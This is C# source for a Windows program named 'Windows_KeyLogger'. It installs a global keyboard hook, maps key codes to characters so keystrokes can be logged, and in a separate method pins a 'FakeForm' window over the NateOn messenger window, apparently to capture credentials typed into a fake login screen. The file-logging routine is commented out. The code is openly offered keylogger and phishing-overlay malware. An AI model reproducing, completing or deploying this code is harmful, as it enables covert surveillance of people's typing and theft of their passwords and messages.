using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;


namespace Windows_KeyLogger
{
    public partial class Form1 : Form
    {
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [DllImport("user32")]
        public static extern int SetWindowPos(int hwnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

        [DllImport("user32")]
        public static extern int GetWindowRect(int hwnd, ref RECT lpRect);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int FindWindow(string strClassName, string strWindowName);
 

        public KeyboardHook hooker = null;
        public Boolean isHooking = false;
        public Dictionary<Keys, String> dicUpper;
        public Dictionary<Keys, String> dicLower;
        public Dictionary<Keys, String> dicNumpad;
        public Dictionary<Keys, String> dicFunc;

        public Form1()
        {
            InitializeComponent();
            hooker = new KeyboardHook(this);
            InitDictionary();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            Button btn = (Button)sender;
            isHooking = !isHooking;
            if (isHooking)
            {
                hooker.hook();
                btn.Text = "Unhook";
                Thread thread = new Thread(savelog);
                thread.Start();
            }
            else
            {
                hooker.unhook();
                btn.Text = "Hook";
            }

        }
        public void gnt()
        {
            IntPtr HWND_TOPMOST = new IntPtr(-1);
            IntPtr no = new IntPtr(0);
            int natehWnd;
            int formhWnd;
            RECT nateonplace = default(RECT);
            int natetop, nateleft, nateright, natebottom;
            natehWnd = FindWindow(null, "NateOn");
            formhWnd = FindWindow(null, "FakeForm");
            while (true)
            {
                GetWindowRect(natehWnd, ref nateonplace);
                natetop = nateonplace.top;
                nateleft = nateonplace.left;
                nateright = nateonplace.right;
                natebottom = nateonplace.bottom;
                SetWindowPos(formhWnd, HWND_TOPMOST, (nateleft)+5, (natetop)+5, nateright-nateleft, natebottom-natetop, 0x40);
            }
        }
        public void savelog()
        {
            //while (isHooking)
            //{
            //    Thread.Sleep(60000);
            //    String strFileName = "C:\\Users\\waps12b\\Documents\\log_" + DateTime.Now.ToString("yyyyMMdd HHmmss") + ".txt";
            //    StreamWriter fsw = new StreamWriter(File.Open(strFileName, FileMode.Create));
            //    fsw.Write(richLog.ToString());
            //    fsw.Close();
            //}
        }

        private void richLog_TextChanged(object sender, EventArgs e)
        {
            richLog.ScrollToCaret();
        }

        private void InitDictionary()
        {
            /* 감지할 키들의 정보를 여기에 삽입합니다. */

            dicUpper = new Dictionary<Keys, String>();
            dicLower = new Dictionary<Keys, String>();
            dicNumpad = new Dictionary<Keys, String>();
            dicFunc = new Dictionary<Keys, String>();

            /* Alphabet 26keys */
            dicLower[Keys.A] = "a"; dicUpper[Keys.A] = "A";
            dicLower[Keys.B] = "b"; dicUpper[Keys.B] = "B";
            dicLower[Keys.C] = "c"; dicUpper[Keys.C] = "C";
            dicLower[Keys.D] = "d"; dicUpper[Keys.D] = "D";
            dicLower[Keys.E] = "e"; dicUpper[Keys.E] = "E";
            dicLower[Keys.F] = "f"; dicUpper[Keys.F] = "F";
            dicLower[Keys.G] = "g"; dicUpper[Keys.G] = "G";
            dicLower[Keys.H] = "h"; dicUpper[Keys.H] = "H";
            dicLower[Keys.I] = "i"; dicUpper[Keys.I] = "I";
            dicLower[Keys.J] = "j"; dicUpper[Keys.J] = "J";
            dicLower[Keys.K] = "k"; dicUpper[Keys.K] = "K";
            dicLower[Keys.L] = "l"; dicUpper[Keys.L] = "L";
            dicLower[Keys.M] = "m"; dicUpper[Keys.M] = "M";
            dicLower[Keys.N] = "n"; dicUpper[Keys.N] = "N";
            dicLower[Keys.O] = "o"; dicUpper[Keys.O] = "O";
            dicLower[Keys.P] = "p"; dicUpper[Keys.P] = "P";
            dicLower[Keys.Q] = "q"; dicUpper[Keys.Q] = "Q";
            dicLower[Keys.R] = "r"; dicUpper[Keys.R] = "R";
            dicLower[Keys.S] = "s"; dicUpper[Keys.S] = "S";
            dicLower[Keys.T] = "t"; dicUpper[Keys.T] = "T";
            dicLower[Keys.U] = "u"; dicUpper[Keys.U] = "U";
            dicLower[Keys.V] = "v"; dicUpper[Keys.V] = "V";
            dicLower[Keys.W] = "w"; dicUpper[Keys.W] = "W";
            dicLower[Keys.X] = "x"; dicUpper[Keys.X] = "X";
            dicLower[Keys.Y] = "y"; dicUpper[Keys.Y] = "Y";
            dicLower[Keys.Z] = "z"; dicUpper[Keys.Z] = "Z";

            /* 상단 숫자 10개 */
            dicLower[Keys.D1] = "1"; dicUpper[Keys.D1] = "!";
            dicLower[Keys.D2] = "2"; dicUpper[Keys.D2] = "@";
            dicLower[Keys.D3] = "3"; dicUpper[Keys.D3] = "#";
            dicLower[Keys.D4] = "4"; dicUpper[Keys.D4] = "$";
            dicLower[Keys.D5] = "5"; dicUpper[Keys.D5] = "%";
            dicLower[Keys.D6] = "6"; dicUpper[Keys.D6] = "^";
            dicLower[Keys.D7] = "7"; dicUpper[Keys.D7] = "&";
            dicLower[Keys.D8] = "8"; dicUpper[Keys.D8] = "*";
            dicLower[Keys.D9] = "9"; dicUpper[Keys.D9] = "(";
            dicLower[Keys.D0] = "0"; dicUpper[Keys.D0] = ")";

            /* 상단 특수문자 3개 */
            dicLower[Keys.Oemtilde] = "`";  dicUpper[Keys.Oemtilde] = "~";
            dicLower[Keys.OemMinus] = "-";  dicUpper[Keys.OemMinus] = "_";
            dicLower[Keys.Oemplus] = "=";   dicUpper[Keys.Oemplus] = "+";

            /* 특수기호 */
            dicLower[Keys.OemOpenBrackets] = "[";   dicUpper[Keys.OemOpenBrackets] = "]";
            dicLower[Keys.OemCloseBrackets] = "{";  dicUpper[Keys.OemCloseBrackets] = "}";
            dicLower[Keys.OemBackslash] = "\\";     dicUpper[Keys.OemBackslash] = "|";

            dicLower[Keys.OemSemicolon] = ";";  dicUpper[Keys.OemSemicolon] = ":";
            dicLower[Keys.OemQuotes] = "\'";    dicUpper[Keys.OemQuotes] = "\"";

            dicLower[Keys.Oemcomma] = ",";      dicUpper[Keys.Oemcomma] = "<";
            dicLower[Keys.OemPeriod] = ".";     dicUpper[Keys.OemPeriod] = ">";
            dicLower[Keys.OemQuestion] = "/";   dicUpper[Keys.OemQuestion] = "?";

            dicLower[Keys.Space] = " "; dicUpper[Keys.Space] = " ";

            /* 특수처리 */
            dicFunc[Keys.Tab] = "□\n";
            dicFunc[Keys.Escape] = "…\n";
            dicFunc[Keys.Enter] = "┘\n";
            dicFunc[Keys.Back] = "←";

            /* 넘버패드 숫자 */
            dicNumpad[Keys.NumPad0] = "0";
            dicNumpad[Keys.NumPad1] = "1";
            dicNumpad[Keys.NumPad2] = "2";
            dicNumpad[Keys.NumPad3] = "3";
            dicNumpad[Keys.NumPad4] = "4";
            dicNumpad[Keys.NumPad5] = "5";
            dicNumpad[Keys.NumPad6] = "6";
            dicNumpad[Keys.NumPad7] = "7";
            dicNumpad[Keys.NumPad8] = "8";
            dicNumpad[Keys.NumPad9] = "9";

            /* 넘버패드 특수기호 */
            dicLower[Keys.Add] = dicUpper[Keys.Add] = "+";
            dicLower[Keys.Subtract] = dicUpper[Keys.Subtract] = "-";
            dicLower[Keys.Multiply] = dicUpper[Keys.Multiply] = "*";
            dicLower[Keys.Decimal] = dicUpper[Keys.Decimal] = ".";
        }

        private void btnNate_Click(object sender, EventArgs e)
        {
            new FakeForm().Show();
            gnt();
        }
    }
}

